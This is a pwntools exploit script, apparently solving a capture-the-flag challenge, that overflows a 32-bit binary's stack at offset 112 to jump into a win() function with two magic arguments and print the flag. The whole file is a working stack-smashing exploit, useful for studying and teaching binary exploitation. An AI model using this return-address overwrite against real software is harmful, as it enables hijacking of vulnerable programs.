#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x8048000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

log.info("""cyclic 200 | vuln

sigsegv on eip=0x62616164

cyclic -l 0x62616164 == offset 112

after that it's just a no-pie smash again

to print the flag without shellcoding the following requirements have to be met in win():

  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);

which come just a few bytes after the saved RIP
""")

EIP_OFFSET = 112

io = start()

io.sendline(cyclic(EIP_OFFSET) + p32(exe.symbols['win']) + cyclic(4) + p32(0xCAFEF00D) + p32(0xF00DF00D))

io.interactive()

